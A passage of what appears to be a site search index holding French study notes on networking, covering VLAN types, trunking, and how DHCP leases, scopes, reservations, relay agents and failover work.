s\u00e9curis\u00e9","text":"<p>Afin de ce connecter \u00e0 distance, le Telnet (23) \u00e9tant non chiffr\u00e9, le protocole SSH (22) sera \u00e0 privil\u00e9gier plutot que le Telnet.  </p> <p>Pour la connexion \u00e0 distance via SSH ce reporter \u00e0 la page Cisco </p>"},{"location":"Reseaux/Switch_VLAN/VLAN/","title":"VLAN: Virtual Local Area Network","text":""},{"location":"Reseaux/Switch_VLAN/VLAN/#presentation-des-vlans","title":"Pr\u00e9sentation des VLANs","text":"<p>Les VLANs permettent de cr\u00e9er des r\u00e9seaux logiques isol\u00e9s dans un r\u00e9seau physique poss\u00e9dant leurs propre plage d'IP unique, limitant les diffusions de broadcast, optimisant la gestion de la bande passante et r\u00e9duisant les risques de collisions. Ils sont d\u00e9fini dans la RFC 2674.  </p>"},{"location":"Reseaux/Switch_VLAN/VLAN/#avantages-des-vlans","title":"Avantages des VLANs","text":"<ol> <li>R\u00e9duction du Broadcast: En isolant les groupes utilisateurs dans des r\u00e9seaux logiques, un groupe utilisateur ne pourra communiquer qu'avec les machines au sein de son groupe, r\u00e9duisant ainsi les diffusions de broadcast de niveau 2 (envoi de requ\u00eate arp sur chaque \u00e9l\u00e9ment du r\u00e9seau)</li> <li>Optimisation de la bande passante: En limitant le broadcast les VLAN optimisent la bande passante, ce qui r\u00e9duit les temps de latence</li> <li>Gestion des utilisateurs par fonction ou service: Ils permettent de regrouper les utilisateurs, facilitant la gestion du r\u00e9seau. Les administrateurs peuvent donc d\u00e9finir des politiques de s\u00e9curit\u00e9, de qualit\u00e9 de service QoS ou de bande passante pour chaque VLAN.</li> <li>Am\u00e9lioration de la s\u00e9curit\u00e9: Chaque VLAN \u00e9tant consid\u00e9r\u00e9 comme un r\u00e9seau distinct il est donc possible de d\u00e9finir des politiques de s\u00e9curit\u00e9 sp\u00e9cifique et ainsi de limiter l'acc\u00e8s aux ressources du r\u00e9seau</li> <li>R\u00e9duction des couts: Un switch peut prendre en charge plusieurs VLAN</li> </ol>"},{"location":"Reseaux/Switch_VLAN/VLAN/#types-de-vlan","title":"Types de VLAN","text":"<p>Il existe diff\u00e9rents types de VLAN. Certains types de VLAN sont d\u00e9finis par les classes de trafic. D'autres types sont d\u00e9finis par leur fonction sp\u00e9cifique.  </p>"},{"location":"Reseaux/Switch_VLAN/VLAN/#vlan-de-donnees-ou-utilisateur","title":"VLAN de donn\u00e9es ou utilisateur","text":"<p>Cetype de VLAN est un VLAN \"normal\", il est celui qui a \u00e9t\u00e9 configur\u00e9 pour rendre une segmentation logique du switch. La num\u00e9rotation des VLANs est disponible sur 12 bits. Chaque mod\u00e8le de switch aura ses limites en nombre de VLAN \u00e0 cr\u00e9er et \u00e0 g\u00e9rer. Pour connecter des utilisateurs et leurs services, on evite d'utiliser le VLAN 1. Un VLAN acheminant du trafic de voix ou de gestion ne peut pas en faire partie, il est d'usage de s\u00e9parer le trafic de voix et de gestion.  </p>"},{"location":"Reseaux/Switch_VLAN/VLAN/#vlan-par-defaut","title":"VLAN par d\u00e9faut","text":"<p>Chez CISCO le Vlan par d\u00e9faut est le 1 Cela n'est pas forc\u00e9ment vrai chez les autres fabricants</p> <p>Par d\u00e9faut le VLAN 1 est celui qui est assign\u00e9 \u00e0 tous les ports d'un switch tant qu'ils n'ont pas \u00e9t\u00e9 configur\u00e9s autrement. Cela signifie que tous les autres types de VLANs (utilisateur, gestion et natif, etc.) sont membres du VLAN 1 par d\u00e9faut. Cela signifie aussi que tous les ports appartiennent au m\u00eame domaine de diffusion, cela permet \u00e0 n'importe quel p\u00e9riph\u00e9rique connect\u00e9 de communiquer avec d'autre p\u00e9riph\u00e9riques eux-m\u00eame connect\u00e9 au domaine de diffusion. Le VLAN 1 ne peut pas \u00eatre renomm\u00e9 ni supprim\u00e9. Par d\u00e9faut, tout le trafic de contr\u00f4le de couche 2 est associ\u00e9 au VLAN 1  </p>"},{"location":"Reseaux/Switch_VLAN/VLAN/#vlan-natif","title":"VLAN Natif","text":"<p>Un vlan natif n'intervient que lorsque l'on configure un port \"Trunk\". Quand un port est un mode \"Trunk\", le switch ins\u00e8re dans la trame le num\u00e9ro de VLAN appropri\u00e9.  </p> <p>Toutes les trames passant par un \"Trunk\" sont ainsi \"tagg\u00e9\" sauf les trames appartenant au VLAN natif. Ce type de VLAN existe pour assurer une inter-op\u00e9rabilit\u00e9 avec du trafic ne supportant pas les \"tag\". Les VLAN natifs sont d\u00e9finis dans la sp\u00e9cification IEEE 802.1Q pour assurer la compatibilit\u00e9 avec le trafic non tagg\u00e9.  </p> <p>Il est recommand\u00e9 de changer le num\u00e9ro du VLAN natif</p>"},{"location":"Reseaux/Switch_VLAN/VLAN/#vlan-de-gestion","title":"VLAN de gestion","text":"<p>C'est un VLAN sp\u00e9cifique attribu\u00e9 aux switchs afin d'\u00eatre accessibles via une IP (ICMP,Telnet, SNMP, HTTP).  </p> <p>Qu'il y est ou non une interface physique appartenant au VLAN de gestion, on joindra le switch en IP via une interface virtuelle de type VLANx. Tous ports \"access\" associ\u00e9s au VLANxr\u00e9pondent en IP pour l'interface virtuelle VLANx.</p> <p>En bonne pratique de configuration, on distinguera des autres VLAN en changeant donc le num\u00e9ro du VLAN de gestion.  </p> <p>Dans le cas d'une temp\u00eate de broadcast ou d'un souci de spanning-tree, l'administrateur doit toujours avoir acc\u00e8s au mat\u00e9riel pour r\u00e9soudre les eventuelles probl\u00e8mes via ce VLAN.  </p> <p>Une autre bonne raison de s\u00e9parer le VLAN de gestion est de s\u00e9parer logiquement les p\u00e9riph\u00e9riques \"dignes de confiance\" des autres. Il s'agit alors d'appliquer les r\u00e8gles de s\u00e9curit\u00e9 n\u00e9cessaires pour \u00e9viter que des utilisateurs classiques ou tout simplement \"non-autoris\u00e9s\" acc\u00e8dent au mat\u00e9riel.  </p>"},{"location":"Reseaux/Switch_VLAN/VLAN/#vlan-voix-voice","title":"VLAN Voix (Voice)","text":"<p>Afin d'assurer la QoS (Qualit\u00e9 de Service) des communications vocales, le VLAN Voice se configure sur un port Access et cr\u00e9e une sorte de mini-Trunk vers un t\u00e9l\u00e9phone IP. Un VLAN distinct est requis car un le trafic voix n\u00e9cessite:  </p> <ul> <li>La bande passante consolid\u00e9e</li> <li>La priorit\u00e9 de QoS \u00e9lev\u00e9e</li> <li>La capacit\u00e9 d'\u00e9viter la ongestion</li> <li>Le d\u00e9lai inf\u00e9rieur \u00e0 150ms de la source \u00e0 la destination</li> </ul> <p></p>"},{"location":"Reseaux/Switch_VLAN/VLAN/#table-dassociation-aux-vlans","title":"Table d'association aux VLANs","text":"<p>L'association d'un VLAN \u00e0 un port se fait par une table d'association. Ainsi les VLANs doivent \u00eatre d\u00e9clar\u00e9s sur le mat\u00e9riel. L'association \u00e0 un VLAN peut se faire en fonction :  </p> <ul> <li>du port;</li> <li>d'une adresse;</li> <li>MAC;</li> <li>d'un protocole;</li> <li>ou d'un sous-reseau IP.</li> </ul> <p>Un port Trunk sera associ\u00e9 aux VLANs qu'il autorise.</p>"},{"location":"Reseaux/Switch_VLAN/VLAN/#vlan-par-port","title":"VLAN par port","text":"<p>C'est le mode d'association par d\u00e9faut.  </p> <p>L'association des trames \u00e0 un VLAN se fait en fonction du PVID du port Access sur lesquels sont branch\u00e9es les stations. Cette solution permet d'affecter pr\u00e9cis\u00e9ment un VLAN en fonction du port sur lequel est branch\u00e9 une machine. Un pirate ne pourra donc avoir acc\u00e8s \u00e0 un VLAN sp\u00e9cifique au niveau 2 du mod\u00e8le OSI que si il se branche sur un port  correspondant au VLAN vis\u00e9.  </p> <p>L'inconv\u00e9nient de ce mode d'affectation est principalement sa lourdeur d'administration. En effet dans le cas ou un p\u00e9riph\u00e9rique est d\u00e9plac\u00e9 et que l'on souhaite qu'il soit toujours dans le m\u00eame VLAN il faudra configurer le nouveau port. Cependant il est possible de simplifier l'administration des ports en couplant cette solution avec de l'authentification 802.1x afin que le nouveau port se configure dynamiquement en fonction de la personne authentifi\u00e9e.  </p>"},{"location":"Reseaux/Switch_VLAN/VLAN/#vlan-par-adresse-mac","title":"VLAN par adresse MAC","text":"<p>Ce mode est situ\u00e9 sur la couche 2 (couche liaison). L'association s'effectue en fonction de la tables d'adresse MAC. Ainsi la trame sera \"tag\" en fonction de l'adresse MAC source de la trame. Dans le cas ou une adresse MAC n'est pas d\u00e9clar\u00e9e elle peut \u00eatre :</p> <ul> <li>associ\u00e9 au VLAN correspondant au PVID du port d'entr\u00e9e</li> <li>associ\u00e9 \u00e0 un VLAN par d\u00e9faut</li> <li>soit refus\u00e9e</li> </ul> <p>Ce mode permet d'avoir une gestion plus modulable et centralis\u00e9e de l'affectation des VLAN. L'architecture est sensible au spoofing MAC  </p>"},{"location":"Reseaux/Switch_VLAN/VLAN/#vlan-par-protocole","title":"VLAN par protocole","text":"<p>Les trames sont associ\u00e9es aux diff\u00e9rents VLANs en fonction du protocole de niveau 3 utilis\u00e9 pour les transmettre. La d\u00e9sencapsulation des paqu\u00eats entrainant une lourdeur de traitement et donc une baisse d'efficacit\u00e9, ce mode est tr\u00e8s peu utilis\u00e9 dans les entreprises.  </p>"},{"location":"Reseaux/Switch_VLAN/VLAN/#vlan-par-sous-reseau-ou-vlan-ip","title":"VLAN par sous-r\u00e9seau ou VLAN IP","text":"<p>Les trames sont associ\u00e9es en fonction du sous r\u00e9seau IP auquel appartient l'adresse IP source. Cette solution permet une gestion centralis\u00e9e de l'affectation des VLANs. La d\u00e9sencapsulation des paquets entra\u00eene une lourdeur de traitement et donc une efficacit\u00e9 moindre que la gestion par adresse MAC ou par port. Elle est sensible aux attaques par spooffing IP. De par ses d\u00e9fauts elle est peu employ\u00e9e dans les entreprises.</p>"},{"location":"Reseaux/Switch_VLAN/VLAN/#numerotation-des-vlan","title":"Num\u00e9rotation des VLAN","text":"<ul> <li>VLAN standard : num\u00e9rot\u00e9 de 1 \u00e0 1001</li> <li>VLAN r\u00e9serv\u00e9s : num\u00e9rot\u00e9 de 1002 \u00e0 1005</li> <li>VLAN \u00e9tendus : num\u00e9rot\u00e9 de 1006 \u00e0 4094</li> </ul>"},{"location":"Reseaux/Switch_VLAN/VLAN/#trunk","title":"Trunk","text":""},{"location":"Reseaux/Switch_VLAN/VLAN/#principe","title":"Principe","text":"<p>En th\u00e9orie pour faire passer les flux d'un VLAN d'un switch \u00e0 l'autre il faudrait un c\u00e2ble pour chaque VLAN cr\u00e9\u00e9 entre les 2 switchs. Plus il y'a de VLAN plus il y aura de c\u00e2ble, ce qui n'est pas le plus \u00e9conomique ni le plus rentable.  </p> <p>Pour \u00e9viter de g\u00e2cher des ressources sur les switchs on utilise un lien \"Trunk\", permettant de faire passer plusieurs VLAN sur un m\u00eame lien. Cela permet \u00e9galement d'\u00e9tendre le VLAN sur l'ensemble du r\u00e9seau.  </p> <p></p> <p>Chaque trame qui passe sur ce lien est \"tag\" par un num\u00e9ro correspondant \u00e0 son VLAN. Le switch transmettra les trames au vlan correspondant en fonction de ses tags. Un \"Tag\" est une \u00e9tiquette qu'on colle au paquet pour savoir \u00e0 quel groupe il appartient.  </p>"},{"location":"Reseaux/Switch_VLAN/VLAN/#vlan-dans-un-environnement-a-plusieurs-switch","title":"VLAN dans un environnement \u00e0 plusieurs switch","text":"<p>Sur un r\u00e9seau de plusieurs VLAN, qui ont plusieurs switches interconnect\u00e9s, il faut utiliser un lien Trunk entre les switchs. Le Trunk marque le VLAN sur l'en-t\u00eate du paquet, avant de l'envoyer sur l'autre switch.  </p> <p></p>"},{"location":"Reseaux/Switch_VLAN/VLAN/#trunk-vlan-configuration-et-verification-de-la-configuration","title":"Trunk &amp; VLAN - Configuration et v\u00e9rification de la configuration","text":"<p>Afin de faire et verifier la bonne configuration ce ref\u00e9rer \u00e0 la Cisco </p>"},{"location":"Reseaux/Switch_VLAN/VLAN/#qos-quality-of-service","title":"QoS : Quality of Service","text":"<p>Ce reporter \u00e0 la page QoS</p>"},{"location":"Reseaux/dhcp/dhcp/","title":"Le Service DHCP","text":""},{"location":"Reseaux/dhcp/dhcp/#definition-du-service-dhcp-dynamic-host-configuration-protocol","title":"D\u00e9finition du service DHCP (Dynamic Host Configuration Protocol)","text":"<p>La fonction Dynamic Host Configuration Protocol (DHCP) est un protocole client/serveur qui fournit automatiquement une adresse Internet Protocol (IP) et d\u2019autres informations de configuration pertinentes \u00e0 un h\u00f4te IP (par exemple, masque de sous-r\u00e9seau et passerelle par d\u00e9faut).    Chaque appareil sur un r\u00e9seau TCP/IP doit avoir une adresse IP unique pour acc\u00e9der au r\u00e9seau et \u00e0 ses ressources. Sans DHCP, les adresses IP des nouveaux ordinateurs ou ordinateurs qui sont d\u00e9plac\u00e9s d\u2019un sous-r\u00e9seau \u00e0 un autre doivent \u00eatre configur\u00e9es manuellement ; les adresses IP des ordinateurs supprim\u00e9s du r\u00e9seau doivent \u00eatre r\u00e9cup\u00e9r\u00e9es manuellement. Avec DHCP, l\u2019ensemble de ce processus est automatis\u00e9 et g\u00e9r\u00e9 de mani\u00e8re centralis\u00e9e. Le serveur DHCP g\u00e8re un pool d\u2019adresses IP et loue une adresse \u00e0 n\u2019importe quel client avec DHCP lorsqu\u2019il d\u00e9marre sur le r\u00e9seau.  </p> <p></p>"},{"location":"Reseaux/dhcp/dhcp/#la-notion-de-bail","title":"La notion de bail","text":"<p>Lorsqu'un client demande au serveur DHCP une adresse IP, le serveur DHCP fournit l'adresse IP et les param\u00e8tres de configuration du r\u00e9seau tels que le masque de sous-r\u00e9seau et les passerelles par d\u00e9faut pour une p\u00e9riode donn\u00e9e - appel\u00e9e bail. La p\u00e9riode pour laquelle le client se voit attribuer l'adresse IP est appel\u00e9e la p\u00e9riode de location. Le client peut utiliser tous les param\u00e8tres r\u00e9seau allou\u00e9s pendant cette p\u00e9riode et est identifi\u00e9 de mani\u00e8re unique dans le r\u00e9seau \u00e0 l'aide de l'adresse IP allou\u00e9e. Pendant ou \u00e0 la fin de la p\u00e9riode de location, si le client souhaite continuer \u00e0 utiliser les m\u00eames param\u00e8tres r\u00e9seau, y compris l'adresse IP, un renouvellement de bail via le serveur DHCP peut \u00eatre demand\u00e9. Le serveur DHCP, \u00e0 la r\u00e9ception de ce message, renouvelle la p\u00e9riode de location du client et le client peut continuer \u00e0 utiliser l'adresse IP pendant une p\u00e9riode prolong\u00e9e. \u00c0 la fin de la p\u00e9riode de location, si un client n'a pas demand\u00e9 de renouvellement, ou si le serveur n'a pas re\u00e7u de demande de renouvellement, le bail de l'IP allou\u00e9e expire. Cela am\u00e8ne le DHCP \u00e0 r\u00e9cup\u00e9rer l'adresse IP et les configurations r\u00e9seau associ\u00e9es, et \u00e0 les rajouter \u00e0 son pool d'adresses IP.  </p> <p></p>"},{"location":"Reseaux/dhcp/dhcp/#lobtention-dun-bail-dora-discover-offer-request-ack","title":"L\u2019obtention d\u2019un bail DORA (Discover, Offer, Request, Ack)","text":"<p>Le processus d'attribution d'une adresse IP et d'autres param\u00e8tres de configuration r\u00e9seau par le serveur DHCP au p\u00e9riph\u00e9rique r\u00e9seau se d\u00e9roule en quatre \u00e9tapes:  </p> Etape 1 : Le client DHCP D\u00e9couvre le serveur DHCP\u00c9tape 2: Le serveur DHCP offre les param\u00e8tres de configuration IP et r\u00e9seau au client.\u00c9tape 3: Le client reconna\u00eet l'offre DHCP requise et demande le bail IP.\u00c9tape 4: Le serveur DHCP accuse r\u00e9ception de la demande de bail IP des clients. <p>Pour qu'un appareil communique au sein d'un r\u00e9seau, il n\u00e9cessite une adresse IP. Un p\u00e9riph\u00e9rique client DHCP acquiert l'adresse IP et les param\u00e8tres r\u00e9seau en diffusant un paquet UDP appel\u00e9 DHCPDISCOVER au sein du r\u00e9seau. Lors de la r\u00e9ception de la diffusion DHCPDISCOVER, tous les serveurs qui ne font pas autorit\u00e9 rejettent ou ignorent le message. Les serveurs DHCP au sein des r\u00e9seaux re\u00e7oivent et traitent le paquet de diffusion. Le message DHCP Discover contient des d\u00e9tails tels que:  </p> <ul> <li>Port source: UDP 68  </li> <li>Port de destination: UDP 67  </li> <li>IP source: 0.0.0.0  </li> <li>IP de destination: 255.255.255.255  </li> </ul> <p>Ici, l'adresse IP source du paquet de diffusion est 0.0.0, car le p\u00e9riph\u00e9rique client n'a pas encore re\u00e7u d'adresse IP. Avec l'adresse IP de destination 255.255.255.255, le paquet de diffusion est envoy\u00e9 \u00e0 tous les p\u00e9riph\u00e9riques du r\u00e9seau, via un processus appel\u00e9 diffusion limit\u00e9e. L'adresse IP de destination peut \u00eatre d\u00e9finie sur un ID de sous-r\u00e9seau particulier pour permettre une diffusion dirig\u00e9e.  </p> <p>Lorsqu'un serveur DHCP valide re\u00e7oit le message de diffusion DHCPDISCOVER, il r\u00e9serve une adresse IP dans son pool d'adresses IP et offre cette adresse IP en location au client demandeur. Il transmet son offre de bail IP, le masque de sous-r\u00e9seau et les passerelles par d\u00e9faut au client demandeur via un message DHCPOFFER .  </p> <ul> <li>Port source UDP 68  </li> <li>Port de destination UDP 67  </li> <li>IP source 192.168.31.9  </li> <li>IP de destination 255.255.255.255  </li> </ul> <p>Ici 192.168.31.9 est le serveur DHCP qui propose une adresse IP de son pool. Traditionnellement, ce message d'offre est envoy\u00e9 au client en sp\u00e9cifiant le mat\u00e9riel ou l'adresse MAC du client.</p> <p>\u00c0 la r\u00e9ception d'un message DHCPOFFER, le client demande l'attribution de l'adresse IP propos\u00e9e via le message DHCPOFFER en envoyant un message DHCPREQUEST au serveur. Ce message signale au serveur DHCP d'attribuer l'adresse IP propos\u00e9e en location au client. \u00c0 la r\u00e9ception de plusieurs messages DHCPOFFER des serveurs du r\u00e9seau, le client envoie un message DHCPREQ (requ\u00eate DHCP) uniquement au serveur DHCP dont le message a \u00e9t\u00e9 re\u00e7u en premier par le client. Les autres offres sont rejet\u00e9es ou ignor\u00e9es.  </p> <ul> <li>Port source UDP 68  </li> <li>Port de destination UDP 67  </li> <li>IP source 0.0.0.0  </li> <li>IP de destination 255.255.255.255  </li> </ul> <p>\u00c0 la r\u00e9ception du message DHCPREQUEST, le serveur DHCP attribue l'adresse IP au client et l'enregistre dans son magasin de donn\u00e9es. Le serveur confirme l'adresse IP allou\u00e9e, le masque de sous-r\u00e9seau et les d\u00e9tails de la passerelle par d\u00e9faut en envoyant un message DHCPACK (accus\u00e9 de r\u00e9ception DHCP). Le client peut maintenant commencer \u00e0 utiliser les param\u00e8tres d'allocation IP et r\u00e9seau.  </p> <ul> <li>Port source UDP 68  </li> <li>Port de destination UDP 67  </li> <li>IP source 0.0.0.0  </li> <li>IP de destination 255.255.255.255  </li> </ul> <p>Le client DHCP se configure avec les param\u00e8tres r\u00e9seau re\u00e7us.  </p> <p></p>"},{"location":"Reseaux/dhcp/dhcp/#le-renouvellement-du-bail","title":"Le renouvellement du bail","text":"<p>Les adresses IP dynamiques sont octroy\u00e9es pour une dur\u00e9e limit\u00e9e (dur\u00e9e du bail, ou lease time), qui est transmise au client dans l'accus\u00e9 de r\u00e9ception qui cl\u00f4ture la transaction DHCP. La valeur T1 (par d\u00e9faut 50% de la dur\u00e9e du bail) qui l'accompagne d\u00e9termine la dur\u00e9e apr\u00e8s laquelle le client commence \u00e0 demander p\u00e9riodiquement le renouvellement de son bail aupr\u00e8s du serveur qui lui a accord\u00e9 son adresse (couramment la moiti\u00e9 de la dur\u00e9e du bail). Cette fois la transaction est effectu\u00e9e par transmission IP classique, d'adresse \u00e0 adresse. Si lorsque le d\u00e9lai fix\u00e9 par la deuxi\u00e8me valeur, T2 (par d\u00e9faut 87,5% de la dur\u00e9e du bail), est \u00e9coul\u00e9, le bail n'a pas pu \u00eatre renouvel\u00e9 (par exemple si le serveur DHCP d'origine est hors service), le client demande une nouvelle allocation d'adresse par diffusion. Si au terme du bail le client n'a pu ni en obtenir le renouvellement, ni obtenir une nouvelle allocation, l'adresse est d\u00e9sactiv\u00e9e et il perd la facult\u00e9 d'utiliser le r\u00e9seau De plus, lorsque le serveur DHCP et le client ne figurent pas sur le m\u00eame brin r\u00e9seau, les diffusions \u00e9mises par le client ne peuvent parvenir au serveur DHCP en raison du fait que les routeurs ne transmettent pas les diffusions g\u00e9n\u00e9rales (aussi appel\u00e9es broadcast). Dans ce genre de situation, il faut alors activer un relais DHCP.  </p>"},{"location":"Reseaux/dhcp/dhcp/#la-resiliation-du-bail","title":"La r\u00e9siliation du bail","text":"<p>Pour mettre fin \u00e0 un bail DHCP, vous pouvez utiliser la commande <code>ipconfig /release</code> sous Windows ou la commande <code>dhclient -r</code> sous Linux. Ces commandes lib\u00e8rent le bail DHCP en cours et en demandent un nouveau au serveur DHCP. Si vous ne souhaitez pas lib\u00e9rer le bail actuel, vous pouvez attendre qu\u2019il expire et l\u2019appareil demandera automatiquement un nouveau bail au serveur DHCP.  </p>"},{"location":"Reseaux/dhcp/dhcp/#les-conteneurs","title":"Les conteneurs","text":""},{"location":"Reseaux/dhcp/dhcp/#les-conteneurs-de-gestion-du-serveur-dhcp-a-la-base-letendue","title":"Les conteneurs de gestion du serveur DHCP. \u00c0 la base : l\u2019\u00e9tendue","text":"<p>L\u2019\u00e9tendue DHCP sp\u00e9cifie la plage d'adresses IP qu'un serveur DHCP peut fournir \u00e0 ses clients. L'\u00e9tendue DHCP doit \u00eatre configur\u00e9e pour d\u00e9terminer le pool d'adresses IP que le serveur DHCP peut louer ou renouveler. En r\u00e8gle g\u00e9n\u00e9rale, une \u00e9tendue s\u2019appuie sur les adresses d\u2019un sous-r\u00e9seau particulier.  </p> <p></p> <p>En ce qui concerne l\u2019attribution des adresses IP des serveurs et des imprimantes, il est conseill\u00e9 de leur attribuer une adresse IP fixe. Ainsi, les adresses contenues dans une \u00e9tendue pr\u00e9d\u00e9finie ne seront pas affect\u00e9es par inadvertance, \u00e0 un autre p\u00e9riph\u00e9rique.</p>"},{"location":"Reseaux/dhcp/dhcp/#les-conteneurs-de-gestion-du-serveur-dhcp-le-plus-cible-la-reservation","title":"Les conteneurs de gestion du serveur DHCP. Le plus cibl\u00e9 : la r\u00e9servation","text":"<p>On parle de r\u00e9servation d\u2019adresses DHCP lorsqu\u2019une adresse IP, au sein d\u2019une \u00e9tendue est \u00e9cart\u00e9e afin d\u2019\u00eatre utilis\u00e9e par un client DHCP sp\u00e9cifique.  </p> <p></p> <p>en ce qui concerne l\u2019attribution des adresses IP des serveurs et des imprimantes, il est conseill\u00e9 de leur attribuer une adresse IP fixe. Ainsi, les adresses contenues dans une \u00e9tendue pr\u00e9d\u00e9finie ne seront pas affect\u00e9es par inadvertance, \u00e0 un autre p\u00e9riph\u00e9rique.</p> <p>Par ailleurs, les p\u00e9riph\u00e9riques ayant d\u00e9j\u00e0 fait l\u2019objet d\u2019une r\u00e9servation disposeront alors \u00e0 coup s\u00fbr d\u2019une adresse IP, lorsqu\u2019une \u00e9tendue vient \u00e0 arriver \u00e0 court d\u2019adresses. Le fait de configurer des r\u00e9servations, permet de centraliser la gestion des adresses IP fixes. Lorsque l\u2019on configure des \u00e9tendues DHCP et des options d\u2019\u00e9tendue, on doit bien \u00e9videmment tenir compte du nombre d\u2019adresses IP que l\u2019on doit assigner et de la fa\u00e7on dont on impl\u00e9mentera la tol\u00e9rance aux pannes. Il est d\u2019ailleurs fortement recommand\u00e9 de disposer de plusieurs serveurs DHCP, au sein du r\u00e9seau. Ainsi, en cas de panne, il y aura toujours un serveur de secours pour distribuer les adresses IP. </p>"},{"location":"Reseaux/dhcp/dhcp/#la-gestion-des-options","title":"La gestion des options","text":""},{"location":"Reseaux/dhcp/dhcp/#les-options-de-configuration","title":"Les options de configuration","text":"<p>Elles compl\u00e8tent la configuration IP des clients DHCP. Quelques exemples :  </p> <p></p>"},{"location":"Reseaux/dhcp/dhcp/#le-positionnement-des-options-dhcp","title":"Le positionnement des options DHCP","text":"<p>Les options peuvent \u00eatre d\u00e9finies :  </p> <ul> <li> <p>Au niveau du serveur : elles concerneront tous les baux distribu\u00e9s par le serveur DHCP.  </p> </li> <li> <p>Pour une \u00e9tendue : elles concerneront les baux de l\u2019\u00e9tendue.  </p> </li> <li> <p>Pour une r\u00e9servation: Elles ne concerneront que la / les r\u00e9servation(s) cibl\u00e9e(s).  </p> </li> </ul>"},{"location":"Reseaux/dhcp/dhcp/#le-dhcp-et-les-reseaux","title":"Le DHCP et les r\u00e9seaux","text":""},{"location":"Reseaux/dhcp/dhcp/#un-serveur-dhcp-pour-plusieurs-reseaux","title":"Un serveur DHCP pour plusieurs r\u00e9seaux","text":"<p>Les appareils peuvent envoyer des messages de diffusion uniquement au sein du r\u00e9seau dont ils font partie. Ils ne peuvent pas diffuser de messages sur les r\u00e9seaux ou sous-r\u00e9seaux. Lorsqu'il n'y a pas de serveur DHCP valide dans un r\u00e9seau, un p\u00e9riph\u00e9rique de ce r\u00e9seau ne peut pas acqu\u00e9rir une adresse IP car il ne peut pas diffuser de messages DHCPDISCOVER aux serveurs en dehors de son r\u00e9seau.  </p> <p>Ce probl\u00e8me est r\u00e9solu en utilisant un agent de relais DHCP.</p> <p>Disons qu'il existe deux r\u00e9seaux, le r\u00e9seau A et le r\u00e9seau B, connect\u00e9s par un routeur. Il existe un serveur DHCP valide sur le r\u00e9seau A. Chaque p\u00e9riph\u00e9rique du r\u00e9seau A peut acqu\u00e9rir un bail IP via ce serveur. Imaginez qu'il n'y ait pas de serveur DHCP sur le r\u00e9seau B. Comme les appareils ne peuvent pas diffuser entre les r\u00e9seaux, les appareils du r\u00e9seau B ne peuvent pas acqu\u00e9rir de bail IP.  </p> <p>Les deux fa\u00e7ons de r\u00e9soudre ce probl\u00e8me sont les suivantes:  </p> <ul> <li>Utilisez un serveur DHCP distinct dans le r\u00e9seau B.  </li> <li>Utilisez un agent de relais DHCP.  </li> </ul> <p></p> <p>Nous utilisons un agent de relais DHCP en configurant le service de relais DHCP dans l'un des p\u00e9riph\u00e9riques du r\u00e9seau B. Ce p\u00e9riph\u00e9rique re\u00e7oit ensuite les messages de diffusion DHCPDISCOVER des clients du r\u00e9seau B, et les transmet au serveur DHCP du r\u00e9seau A. Le serveur envoie le DHCPOFFER \u00e0 l'agent de relais du r\u00e9seau B, qui diffuse le message au sein de son r\u00e9seau. De m\u00eame, les messages DHCPREQ et DHCPACK sont \u00e9chang\u00e9s entre le client DHCP dans le r\u00e9seau B et le serveur DHCP dans le r\u00e9seau A en les relayant via l'agent DHCP qui peut agir comme l'homme du milieu. L'agent de relais peut \u00eatre un p\u00e9riph\u00e9rique au sein du r\u00e9seau, ou le routeur r\u00e9seau lui-m\u00eame peut \u00eatre configur\u00e9 pour fournir un service de relais DHCP.  </p>"},{"location":"Reseaux/dhcp/dhcp/#le-dhcp-et-les-reseaux_1","title":"Le DHCP et les r\u00e9seaux","text":""},{"location":"Reseaux/dhcp/dhcp/#dhcp-dans-un-contexte-de-domaine","title":"DHCP dans un contexte de domaine","text":"<p>La notion d\u2019autorisation : Le ou les serveurs DHCP doivent \u00eatre autoris\u00e9s pour d\u00e9marrer les services et fournir le service.  </p> <p>Incidence de la non autorisation : Le service DHCP d\u2019un serveur membre non autoris\u00e9 ne d\u00e9marrera pas Le service DHCP d\u2019un serveur autonome pr\u00e9sent dans le domaine de diffusion d\u2019un serveur autoris\u00e9 s\u2019arr\u00eatera  </p> <p>Les serveurs DHCP autres que Microsoft ne prennent pas en compte cette autorisation</p>"},{"location":"Reseaux/dhcp/dhcp/#les-operations-de-gestion-de-la-base-dhcp","title":"Les op\u00e9rations de gestion de la base DHCP","text":"<p>L\u2019ensemble des donn\u00e9es de configuration est stock\u00e9 dans une base.  </p> <p>Un certain nombre d\u2019op\u00e9rations peuvent \u00eatre effectu\u00e9es : - Sauvegardes : Synchrone ou Asynchrone - Restaurations - Contr\u00f4le de la coh\u00e9rence de la base - D\u00e9placement de la base  </p>"},{"location":"Reseaux/dhcp/dhcp/#le-fractionnement-detendues","title":"Le fractionnement d\u2019\u00e9tendues","text":"<p>Le fractionnement d'une \u00e9tendu DHCP peut augmenter la tol\u00e9rance aux pannes. Ainsi avec cette option, si un serveur devient indisponible alors l'autre serveur peut prendre sa place et continuer \u00e0 louer de nouvelles adresses IP ou \u00e0 renouveler des clients existants. Il permet d\u2019automatiser la cr\u00e9ation d\u2019une \u00e9tendue sur deux serveurs ayant la charge de la plage correspondante.  </p> <p> Les modifications pouvant \u00eatre apport\u00e9es apr\u00e8s cr\u00e9ation ne sont pas r\u00e9pliqu\u00e9es entre les deux serveurs ayant la charge de l\u2019\u00e9tendue (elles sont \u00e0 faire sur les deux).  </p>"},{"location":"Reseaux/dhcp/dhcp/#pour-aller-plus-loin","title":"Pour aller plus loin","text":"<p>Pour les probl\u00e9matiques de panne et de disponibilit\u00e9 : - Configurer un serveur DHCP \u00ab de secours \u00bb : op\u00e9rationnel, mais non d\u00e9marr\u00e9 - La solution DHCP failover :  (1)</p> <ol> <li> <p>2 modes existent :  </p> <p>Actif / Actif (load balanced)</p> <p>Ce mode est recommande lorsque les 2 serveur DHCP sont situ\u00e9s sur un m\u00eame site g\u00e9ographique. Il est n\u00e9cessaire de d\u00e9finir la r\u00e9partition de charge d\u00e9sir\u00e9e pour \u00e9quilibrer (ou non) la distribution d\u2019adresse IP des 2 serveurs. Chaque serveur se verra attribu\u00e9 une plage d\u2019IP a distribu\u00e9 contenue dans l\u2019\u00e9tendue. Contrairement \u00e0 un serveur DHCP standalone, les IP distribu\u00e9e ne seront donc pas s\u00e9quentielles.</p> <p>Actif / Passif (hot standby)</p> <p>Ce mode est recommand\u00e9 lorsqu\u2019on dispose de 2 serveurs DHCP r\u00e9partis sur 2 sites g\u00e9ographiques diff\u00e9rents.</p> </li> </ol> <p>Pour am\u00e9liorer la s\u00e9curit\u00e9 : - Mettre en 